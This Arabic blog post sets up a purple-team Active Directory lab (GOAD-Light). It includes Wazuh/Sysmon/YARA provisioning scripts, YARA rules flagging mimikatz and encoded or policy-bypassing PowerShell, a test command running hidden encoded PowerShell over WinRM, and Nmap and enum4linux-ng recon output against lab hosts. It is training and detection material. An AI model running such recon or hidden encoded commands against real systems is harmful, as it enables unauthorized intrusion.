---
header:
 image: /assets/images/GOAD-Light/Purple.png
 teaser: /assets/images/GOAD-Light/Purple.png
title: "GOAD-Light Purple Teaming"
toc: true
toc_sticky: true
author_profile: true
layout: single
permalink: /lab/GOAD-Light-Purple-Teaming/ar/
date: 2026-09-25
categories: [Lab]
tags:
  - Active Directory
  - Penetration Testing
  - Detection Engineering
  - Traffic Analysis
---
{% include arabic-btn.html %}

# المقدمة
السلام عليكم ورحمة الله وبركاته، اليوم بنسوي لاب عن ال **Active Directory**. هذا النظام من مايكروسوفت موجود في اغلب المنظمات وخاصة اذا كان عندها موظفين كثير وفي دول مختلفه. بناء خبره عن النظام كتسطيب واختراق يساعدك تحدد ثغرات موجوده في الانظمه الجاهزة كمنهدس سكيورتي أو اختراقها كبينتيستر عشان تحصل العيوب وتخبر الشركة او اذا كنت SOC في المنظمه ممكن تتعرف على المؤشرات اللي تبين وجود محاولة اختراق او استخراج بيانات فيما بعد. 
لذلك رغم ان اللاب فقط ريد تيمنق، اخذته وحولته ل **Purple Teaming** عشان نجمع مابين المجالات في السكيورتي ويكون عندنا أساس وفهم افضل

فكرة هذا اللاب ان فيه ثغرات كثير محطوطه في اماكن مختلفه واحنا اللي علينا اننا نحصلها ونسوي لها اكسبلويت وندخل عالسستم منها
![](/Assets/images/GOAD-Light/AD.png)
# السيت اب للاب
اللاب راح يكون من عند [GOAD-Light](https://orange-cyberdefense.github.io/GOAD/labs/GOAD-Light/#servers).
![](/Assets/images/GOAD-Light/GOAD-Light_schema.png)
**ملاحظة**: عشان تتفادى اخطاء متعبه بعدين، تأكد من تسطيب اللاب بشكل صحيح

## تعديلي ونصايح
لاب **GOAD** ممتاز كما هو، يعني ممكن تتفادى تسوي اللي انا بسويه وماتضيف SIEM لكن زي ماذكرت اني سويت كذا عشان اجمع بين البلو والريد تيم.

**شكل اللاب بعد تعديلي:**
![](/Assets/images/GOAD-Light/GOAD_Light_Purple_Lab.png)

### جهاز المهاجم

اللاب يعطيك اجهزة الويندوز فراح تحتاج تسوي لك اتاكر مشين. عشان ماتتعب، حطيت الخطوات بشكل بسيط تحت واهم شي تأكد انك يمديك توصل لأجهزة الويندوز بانك تسوي لها ping

- Settings --> Network Adapter --> vmnet (حط نفس ال vmnet حقت ال AD)
- ضيف ايبي على نفس السبنت بذي. الكوماندات (من داخل الاتاكر مشين):

``` bash
# 1 Get connection name
nmcli connection show

# 2 Assign static IP, Gateway, and set DNS to DC01 (192.168.56.10)
sudo nmcli con mod "Wired connection 1" ipv4.addresses 192.168.56.99/24
sudo nmcli con mod "Wired connection 1" ipv4.dns "192.168.56.10"
sudo nmcli con mod "Wired connection 1" ipv4.dns-search "sevenkingdoms.local,north.sevenkingdoms.local"
sudo nmcli con mod "Wired connection 1" ipv4.method manual

# 3 Apply changes
sudo nmcli con down "Wired connection 1" && sudo nmcli con up "Wired connection 1"

# 4 Check IP
ip a

# 5 Test Connectivity 
ping 192.168.56.10 
# Test the AD VMs by pinging their IPs and also you can test the DNS

```

### Sysmon & Wazuh Setup 
ذي الخطوة تسوي فيها سيت اب للسيم وسيسمون لتجميع اللوجز، سويتها بذي الطريقه بدون مادخل الاجهزة. ركز في الخطوات الجايه

داخل ملف اللاب (~/GOAD/workspace/اسم الVM اللي بتستخدمه/provider) في ملف **Vagrantfile** افتحه وبدل الكونتن اللي داخله باللي موجود تحت
``` bash
# THERE ARE MULTIPLE STEPS HERE SO GO THROUGH THEM CAREFULLY

# STEP 1: Update the Vagrantfile script to setup Wazuh, Sysmon, Audit Policies, and YARA Rules.

# Open the Vagrantfile to check it out
nano Vagrantfile
# Remove all the content inside the file
: > Vagrantfile # Copy it to your notes just in case

# Paste this new code
Vagrant.configure("2") do |config|

  ENV['VAGRANT_DEFAULT_PROVIDER'] = 'vmware_desktop'

  boxes = [
    # windows server 2019
    { :name => "GOAD-Light-DC01",  :ip => "192.168.56.10", :box => "StefanScherer/windows_2019", :box_version => "2021.05.15", :os => "windows", :cpus => 2, :mem => 3000},
    # windows server 2019
    { :name => "GOAD-Light-DC02",  :ip => "192.168.56.11", :box => "StefanScherer/windows_2019", :box_version => "2021.05.15", :os => "windows", :cpus => 2, :mem => 3000},
    # windows server 2019
    { :name => "GOAD-Light-SRV02", :ip => "192.168.56.22", :box => "StefanScherer/windows_2019", :box_version => "2021.05.15", :os => "windows", :cpus => 2, :mem => 6000}
  ]

  config.vm.provider "vmware_desktop" do |v|
    v.force_vmware_license = "workstation"  # force the licence for fix some vagrant plugin issue
    # v.gui = true
  end

  # disable rdp forwarded port inherited from StefanScherer box
  config.vm.network :forwarded_port, guest: 3389, host: 3389, id: "rdp", auto_correct: true, disabled: true

  # no autoupdate if vagrant-vbguest is installed
  if Vagrant.has_plugin?("vagrant-vbguest") then
    config.vbguest.auto_update = false
  end

  config.vm.boot_timeout = 600
  config.vm.graceful_halt_timeout = 600
  config.winrm.retry_limit = 30
  config.winrm.retry_delay = 10

  boxes.each do |box|
    config.vm.define box[:name] do |target|
      # BOX
      target.vm.provider "vmware_desktop" do |v|
        v.vmx["memsize"] = box[:mem]
        v.vmx["numvcpus"] = box[:cpus]
      end

      target.vm.box_download_insecure = box[:box]
      target.vm.box = box[:box]
      if box.has_key?(:box_version)
        target.vm.box_version = box[:box_version]
      end

      # issues/49
      target.vm.synced_folder '.', '/vagrant', disabled: true

      # IP
      target.vm.network :private_network, ip: box[:ip]

      # OS specific
      if box[:os] == "windows"
        target.vm.guest = :windows
        target.vm.communicator = "winrm"
        target.vm.provision :shell, :path => "../../../vagrant/Install-WMF3Hotfix.ps1", privileged: false
        target.vm.provision :shell, :path => "../../../vagrant/ConfigureRemotingForAnsible.ps1", privileged: false

        if ENV['VAGRANT_DEFAULT_PROVIDER'] == "vmware_desktop"
        
          target.vm.provision "shell", inline: "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File ../../../vagrant/fix_ip.ps1 #{box[:ip]}' -WindowStyle Hidden; Start-Sleep -Seconds 3", privileged: false
        end

        # Calls external Wazuh.YARA.ps1 script in the same directory
        target.vm.provision "shell", path: File.join(File.dirname(__FILE__), "Wazuh.YARA.ps1"), privileged: true

      else
        target.vm.communicator = "ssh"
      end

      if box.has_key?(:forwarded_port)
        # forwarded port explicit
        box[:forwarded_port] do |forwarded_port|
          target.vm.network :forwarded_port, guest: forwarded_port[:guest], host: forwarded_port[:host], host_ip: "127.0.0.1", id: forwarded_port[:id]
        end
      end

    end
  end
end
```

``` bash
# STEP 2: Deploying Wazuh Docker on your device

# First, clone Wazuh to your system
cd ~/Desktop
# NOTE: Make sure Docker is running, if not just start the application
docker --version
docker compose version
git clone https://github.com/wazuh/wazuh-docker.git -b v4.8.0 --depth 1
cd wazuh-docker/single-node
docker compose up -d
docker ps # 3 images should be running and show you all 3 ports
# Quick note: If the localhost:5601 isnt running, its probably because the indexer is not running. Make sure the three images are running.
#==============================================================================

# STEP 3: Make a new .ps1 file in /provider directory where Vagrant file is and paste this code. 
# This PowerShell code sets up PowerShell Logging, Wazuh Agent, and YARA rules

# NOTE: The .ps1 file name has to match Wazuh.YARA.ps1, because it is triggered in step 1 in the Vagrantfile.

# ============================================================================
# 1. PRE-FLIGHT & NETWORK STABILIZATION
# ============================================================================
$ErrorActionPreference = 'Stop'
$ProgressPreference = 'SilentlyContinue' # Disables native progress bars that break WinRM
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Internet Explorer\Main" -Name "DisableFirstRunCustomize" -Value 1 -Type DWord -ErrorAction SilentlyContinue

Write-Host "[*] Waiting for network to stabilize after IP reconfiguration..." -ForegroundColor Cyan
$MaxRetries = 12
$RetryCount = 0
$NetworkUp = $false

while (-not $NetworkUp -and $RetryCount -lt $MaxRetries) {
    $Test = Test-NetConnection -ComputerName "github.com" -Port 443 -InformationLevel Quiet
    if ($Test) {
        $NetworkUp = $true
        Write-Host "[+] Internet connectivity confirmed." -ForegroundColor Green
    } else {
        Write-Host "[-] Network not ready, waiting 5 seconds..." -ForegroundColor Yellow
        Start-Sleep -Seconds 5
        $RetryCount++
    }
}

if (-not $NetworkUp) {
    Write-Host "[!] CRITICAL: Could not reach the internet. Downloads will fail." -ForegroundColor Red
}

# ============================================================================
# 2. POWERSHELL LOGGING CONFIGURATION
# ============================================================================
Write-Host "[+] Enabling PowerShell Script Block and Module Logging..." -ForegroundColor Green
$PSLogPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"
if (-not (Test-Path "$PSLogPath\ScriptBlockLogging")) { New-Item -Path "$PSLogPath\ScriptBlockLogging" -Force | Out-Null }
Set-ItemProperty -Path "$PSLogPath\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 1 -Type DWord
Set-ItemProperty -Path "$PSLogPath\ScriptBlockLogging" -Name "EnableScriptBlockInvocationLogging" -Value 1 -Type DWord

if (-not (Test-Path "$PSLogPath\ModuleLogging\ModuleNames")) { New-Item -Path "$PSLogPath\ModuleLogging\ModuleNames" -Force | Out-Null }
Set-ItemProperty -Path "$PSLogPath\ModuleLogging" -Name "EnableModuleLogging" -Value 1 -Type DWord
Set-ItemProperty -Path "$PSLogPath\ModuleLogging\ModuleNames" -Name "*" -Value "*" -Type String

# ============================================================================
# 3. SYSMON INSTALLATION
# ============================================================================
Write-Host "[+] Downloading and Installing Sysmon..." -ForegroundColor Green
$SysmonDir = "$env:TEMP\Sysmon"
if (-not (Test-Path $SysmonDir)) { New-Item -ItemType Directory -Path $SysmonDir -Force | Out-Null }

$SysmonZip = "$SysmonDir\Sysmon.zip"
$SysmonConfig = "$SysmonDir\sysmonconfig.xml"

# Download Sysmon and SwiftOnSecurity Config
Invoke-WebRequest -Uri "https://download.sysinternals.com/files/Sysmon.zip" -OutFile $SysmonZip -UseBasicParsing -TimeoutSec 60
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml" -OutFile $SysmonConfig -UseBasicParsing -TimeoutSec 60

Expand-Archive -Path $SysmonZip -DestinationPath $SysmonDir -Force

# Install Sysmon Silently
Start-Process -FilePath "$SysmonDir\sysmon64.exe" -ArgumentList "-accepteula -i `"$SysmonConfig`"" -Wait -WindowStyle Hidden
Write-Host "[+] Sysmon installed and running." -ForegroundColor Green

# ============================================================================
# 4. YARA INSTALLATION
# ============================================================================
Write-Host "[+] Downloading and Setting up YARA..." -ForegroundColor Green
$YaraDir = "C:\Program Files (x86)\ossec-agent\active-response\bin\yara"
if (-not (Test-Path $YaraDir)) { New-Item -ItemType Directory -Path $YaraDir -Force | Out-Null }

$YaraZip = "$env:TEMP\yara.zip"
Invoke-WebRequest -Uri "https://github.com/VirusTotal/yara/releases/download/v4.5.2/yara-v4.5.2-2326-win64.zip" -OutFile $YaraZip -UseBasicParsing -TimeoutSec 60
Expand-Archive -Path $YaraZip -DestinationPath $YaraDir -Force
Remove-Item $YaraZip -Force

# Write YARA Rules
$YaraRulesContent = @'
rule EICAR_Test { strings: $a = "EICAR-STANDARD-ANTIVIRUS-TEST-FILE" condition: $a }
rule Mimikatz_Strings { strings: $m1 = "mimikatz" nocase condition: any of ($m*) }
rule Suspicious_PowerShell { strings: $ps1 = "-ExecutionPolicy Bypass" nocase $ps2 = "-EncodedCommand" nocase condition: any of ($ps*) }
'@
$RulesFilePath = "$YaraDir\rules.yar"
Set-Content -Path $RulesFilePath -Value $YaraRulesContent -Encoding UTF8
Write-Host "[+] YARA rules successfully updated." -ForegroundColor Green

# ============================================================================
# 5. WAZUH AGENT INSTALLATION
# ============================================================================
$WazuhManagerIP = "192.168.56.1"

# ---> CHANGE THIS TO MATCH YOUR DASHBOARD VERSION EXACTLY <---
$AgentVersion = "4.8.0" 

Write-Host "[+] Checking for mismatched Wazuh versions..." -ForegroundColor Yellow
$UninstallStr = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" -ErrorAction SilentlyContinue | Where-Object DisplayName -eq "Wazuh Agent").UninstallString

if ($UninstallStr) {
    Write-Host "[!] Existing Wazuh agent found. Uninstalling for clean version install..." -ForegroundColor Yellow
    $CleanArgs = $UninstallStr -replace 'msiexec.exe ','' -replace '/I','/X' -replace '/i','/X'
    $CleanArgs += " /quiet"
    Start-Process msiexec.exe -ArgumentList $CleanArgs -Wait
}

$AgentMsi = "$env:TEMP\wazuh-agent.msi"
$WazuhUrl = "https://packages.wazuh.com/4.x/windows/wazuh-agent-$AgentVersion-1.msi"

Write-Host "[+] Downloading and Installing Wazuh Agent v$AgentVersion..." -ForegroundColor Green
Invoke-WebRequest -Uri $WazuhUrl -OutFile $AgentMsi -UseBasicParsing -TimeoutSec 60
Start-Process msiexec.exe -ArgumentList "/i `"$AgentMsi`" /q WAZUH_MANAGER=`"$WazuhManagerIP`" WAZUH_REGISTRATION_SERVER=`"$WazuhManagerIP`"" -Wait
Remove-Item $AgentMsi -Force
# ============================================================================
# 6. WAZUH LOG FORWARDING CONFIGURATION
# ============================================================================
Write-Host "[+] Configuring Wazuh to forward Sysmon and PowerShell logs..." -ForegroundColor Green
$OssecConf = "C:\Program Files (x86)\ossec-agent\ossec.conf"

if (Test-Path $OssecConf) {
    [xml]$xml = Get-Content $OssecConf

    function Add-LogChannel($channelName) {
        $exists = $xml.ossec_config.localfile | Where-Object { $_.location -eq $channelName }
        if (-not $exists) {
            $localfile = $xml.CreateElement("localfile")
            
            $location = $xml.CreateElement("location")
            $location.InnerText = $channelName
            $localfile.AppendChild($location) | Out-Null
            
            $logformat = $xml.CreateElement("log_format")
            $logformat.InnerText = "eventchannel"
            $localfile.AppendChild($logformat) | Out-Null
            
            $xml.ossec_config.AppendChild($localfile) | Out-Null
        }
    }

    Add-LogChannel "Microsoft-Windows-Sysmon/Operational"
    Add-LogChannel "Microsoft-Windows-PowerShell/Operational"
    
    $xml.Save($OssecConf)
    
    if (Get-Service Wazuh -ErrorAction SilentlyContinue) {
        Restart-Service Wazuh
    }
}

Write-Host "[+] SUCCESS: All tools installed and Wazuh agent restarted." -ForegroundColor Green

```

 هذا السكربت يجهز لنا الانفايرونمينت مع سيسمون وسيم لتجميع الايفنتس ممكن ايضا تضيف اللي انت حابه زي ما انا ضفت شوية يارا رولز ممكن نضيف اكثر وغيرها

بعد ما اضفنا كل شي، نسوي تيست بسيط للسكربت ونشوف اذا شغال او لا

``` bash
# ابديت لكل الفي امز 
vagrant provision
# ابديت للماشينز بفنكشن معينه من السكربت الماضي
vagrant --provision-with sysmon
# ابديت ل في ام معين
vagrant provision GOAD-Light-DC01
# ابديت ل في ام معين مع فنكشن معينه
vagrant provision GOAD-Light-DC02 --provision-with wazuh-agent
```

**ملاحظة بسيطة**: اذا واجهت اخطاء تأكد من المشاكل الشائعة زي الكونفيجريشن للشبكه او اذا الفي امز شغاله او لا واذا جهازك يتحمل النوع هذا من اللاب او لا. برضو مو لازم تكون مشغل السيم طول الوقت اللي انت بتحاول تسوي الاتاك وتجمع ايفنتس مالها داعي، تأكد ان السيم شغال وبيجمع اللوجز وبعدها طفيه وشغله وقت ماتحتاج تشوف ترافيك او لوجز معينه بعد ماتسوي الاتاك

**بعد تحديث الفي امز**![After updating all VMs](/Assets/images/GOAD-Light/Vagrant-Prov.png)

**سيت اب باور شيل**
![](/Assets/images/GOAD-Light/Wazuh-ps1.png)

**سيت اب دوكر للسيم**
![](/Assets/images/GOAD-Light/Wazuh-DockerDeploy.png)

**كل ال Images لازم تكون up**
![](/Assets/images/GOAD-Light/Wazuh-Docker.png)

**وازو سيم داشبورد**
![](/Assets/images/GOAD-Light/Wazuh-Dash.png)

**جرب السيم**
``` bash
vagrant winrm GOAD-Light-DC01 -e -c "powershell.exe -ExecutionPolicy Bypass -nop -w hidden -EncodedCommand AAAA"
```
![](/Assets/images/GOAD-Light/siemtst.png)
الان احنا جاهزين

# Red Teaming
هذي الوحدة راح نغطي فيها اساسيات الريد تيمنق ب اننا نحاول نخترق الاكتف دايريكتوري من ريكون الى بوست اكسبلويت ركز واستمتع واذا في مصطلح او تول جديده عليك سوي ريسيرش عنها عشان تفهم افضل

## Reconnaissance
راح نبدا بسكان للشبكة باستخدام **Nmap**. ممكن برضو نستخدم **Rustscan** للسكان بما انه اسرع وعشان مانضيع شي مهم
``` bash
$ sudo nmap -sCV -p- 192.168.56.0/24 -oN rez.txt

# Scan Results:
# Nmap scan report for 192.168.56.10
Host is up (0.0012s latency).
Not shown: 985 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-10 12:08:19Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-10T12:11:23+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:kingslanding.sevenkingdoms.local
| Not valid before: 2026-08-09T18:28:21
|_Not valid after:  2027-08-09T18:28:21
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-10T12:11:23+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:kingslanding.sevenkingdoms.local
| Not valid before: 2026-08-09T18:28:21
|_Not valid after:  2027-08-09T18:28:21
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-10T12:11:23+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:kingslanding.sevenkingdoms.local
| Not valid before: 2026-08-09T18:28:21
|_Not valid after:  2027-08-09T18:28:21
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:kingslanding.sevenkingdoms.local
| Not valid before: 2026-08-09T18:28:21
|_Not valid after:  2027-08-09T18:28:21
|_ssl-date: 2026-08-10T12:11:23+00:00; 0s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-10T12:11:23+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SEVENKINGDOMS
|   NetBIOS_Domain_Name: SEVENKINGDOMS
|   NetBIOS_Computer_Name: KINGSLANDING
|   DNS_Domain_Name: sevenkingdoms.local
|   DNS_Computer_Name: kingslanding.sevenkingdoms.local
|   DNS_Tree_Name: sevenkingdoms.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-10T12:10:49+00:00
| ssl-cert: Subject: commonName=kingslanding.sevenkingdoms.local
| Not valid before: 2026-08-08T17:49:38
|_Not valid after:  2027-02-07T17:49:38
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp open  ssl/wsmans?
| ssl-cert: Subject: commonName=VAGRANT
| Subject Alternative Name: DNS:VAGRANT, DNS:vagrant
| Not valid before: 2026-08-08T10:29:28
|_Not valid after:  2029-08-07T10:29:28
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-08-10T12:11:23+00:00; 0s from scanner time.
MAC Address: 00:0C:29:6A:E7:D9 (VMware)c
Service Info: Host: KINGSLANDING; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-10T12:10:50
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: KINGSLANDING, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:6a:e7:d9 (VMware)

# Nmap scan report for 192.168.56.11
Host is up (0.0013s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-08-10 12:08:19Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:winterfell.north.sevenkingdoms.local
| Not valid before: 2026-08-09T20:26:09
|_Not valid after:  2027-08-09T20:26:09
|_ssl-date: 2026-08-10T12:11:23+00:00; 0s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-08-10T12:11:23+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:winterfell.north.sevenkingdoms.local
| Not valid before: 2026-08-09T20:26:09
|_Not valid after:  2027-08-09T20:26:09
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sevenkingdoms.local, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:winterfell.north.sevenkingdoms.local
| Not valid before: 2026-08-09T20:26:09
|_Not valid after:  2027-08-09T20:26:09
|_ssl-date: 2026-08-10T12:11:23+00:00; 0s from scanner time.
3269/tcp open  ssl/ldap
| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:winterfell.north.sevenkingdoms.local
| Not valid before: 2026-08-09T20:26:09
|_Not valid after:  2027-08-09T20:26:09
|_ssl-date: 2026-08-10T12:11:23+00:00; 0s from scanner time.
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-08-10T12:11:23+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=winterfell.north.sevenkingdoms.local
| Not valid before: 2026-08-08T18:12:21
|_Not valid after:  2027-02-07T18:12:21
| rdp-ntlm-info: 
|   Target_Name: NORTH
|   NetBIOS_Domain_Name: NORTH
|   NetBIOS_Computer_Name: WINTERFELL
|   DNS_Domain_Name: north.sevenkingdoms.local
|   DNS_Computer_Name: winterfell.north.sevenkingdoms.local
|   DNS_Tree_Name: sevenkingdoms.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-10T12:10:50+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp open  ssl/wsmans?
|_ssl-date: 2026-08-10T12:11:23+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=VAGRANT
| Subject Alternative Name: DNS:VAGRANT, DNS:vagrant
| Not valid before: 2026-08-08T10:32:16
|_Not valid after:  2029-08-07T10:32:16
MAC Address: 00:0C:29:64:73:57 (VMware)
Service Info: Host: WINTERFELL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-10T12:10:50
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: WINTERFELL, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:64:73:57 (VMware)

# Nmap scan report for 192.168.56.22
Host is up (0.00097s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesnt have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2026-08-10T12:11:23+00:00; 0s from scanner time.
| ms-sql-info: 
|   192.168.56.22:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-10T10:48:07
|_Not valid after:  2056-08-10T10:48:07
| ms-sql-ntlm-info: 
|   192.168.56.22:1433: 
|     Target_Name: NORTH
|     NetBIOS_Domain_Name: NORTH
|     NetBIOS_Computer_Name: CASTELBLACK
|     DNS_Domain_Name: north.sevenkingdoms.local
|     DNS_Computer_Name: castelblack.north.sevenkingdoms.local
|     DNS_Tree_Name: sevenkingdoms.local
|_    Product_Version: 10.0.17763
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=castelblack.north.sevenkingdoms.local
| Not valid before: 2026-08-08T18:26:55
|_Not valid after:  2027-02-07T18:26:55
|_ssl-date: 2026-08-10T12:11:23+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: NORTH
|   NetBIOS_Domain_Name: NORTH
|   NetBIOS_Computer_Name: CASTELBLACK
|   DNS_Domain_Name: north.sevenkingdoms.local
|   DNS_Computer_Name: castelblack.north.sevenkingdoms.local
|   DNS_Tree_Name: sevenkingdoms.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-08-10T12:10:50+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
5986/tcp open  ssl/wsmans?
|_ssl-date: 2026-08-10T12:11:23+00:00; 0s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=VAGRANT
| Subject Alternative Name: DNS:VAGRANT, DNS:vagrant
| Not valid before: 2026-08-08T10:37:20
|_Not valid after:  2029-08-07T10:37:20
MAC Address: 00:0C:29:2A:E9:1F (VMware)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-08-10T12:10:51
|_  start_date: N/A
|_nbstat: NetBIOS name: CASTELBLACK, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:2a:e9:1f (VMware)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

Nmap scan report for 192.168.56.99
Host is up.                                                                      
All 1000 scanned ports on 192.168.56.99 are in ignored states.                   
Not shown: 1000 filtered tcp ports (no-response)                                 
Post-scan script results:                                                        
| clock-skew:                                                                    
|   0s:                                                                          
|     192.168.56.10                                                              
|     192.168.56.22                                                              
|_    192.168.56.11                                        
```
**اهم النتائج**:
- اكثر من بورت مهمين مفتوحه
- ٣ ايبي لأجهزه داخل الدومين وواحد منهم سيرفر
- اسامي الدومينز
- Domains: **sevenkingdoms.local**, **winterfell.north.sevenkingdoms.local**, **castelblack.north.sevenkingdoms.local**

## Enumeration (External)
الان راح نجمع معلومات باستخدام الايبيز اللي حصلناها باستخدام تول **enum4linux-ng**

هذي التول راح تساعدنا نعرف اذا نقدر ندخل انونيمس لوقن (بدون رمز) ومنها نجمع معلومات عن الاكتف دايركتوري كشروط وقوانين الرمز واليوزرس
```bash
# Domain enum
$ enum4linux-ng -A "$TARGET" # Target is sevenkingdoms.local           

ENUM4LINUX - next generation (v1.3.10)
 ==========================
|    Target Information    |
 ==========================
[*] Target ........... kingslanding.sevenkingdoms.local
[*] Username ......... ''
[*] Random Username .. 'thxdijqh'
[*] Password ......... ''
[*] Timeout .......... 10 second(s)
 =========================================================
|    Listener Scan on kingslanding.sevenkingdoms.local    |
 =========================================================
[*] Checking LDAP
[+] LDAP is accessible on 389/tcp
[*] Checking LDAPS
[+] LDAPS is accessible on 636/tcp
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp
 ========================================================================
|    Domain Information via LDAP for kingslanding.sevenkingdoms.local    |
 ========================================================================
[*] Trying LDAP
[+] Appears to be root/parent DC
[+] Long domain name is: sevenkingdoms.local
 ===============================================================================
|    NetBIOS Names and Workgroup/Domain for kingslanding.sevenkingdoms.local    |
 ===============================================================================
[+] Got domain/workgroup name: SEVENKINGDOMS
[+] Full NetBIOS names information:
- KINGSLANDING    <00> -         M <ACTIVE>  Workstation Service                 
- SEVENKINGDOMS   <00> - <GROUP> M <ACTIVE>  Domain/Workgroup Name               
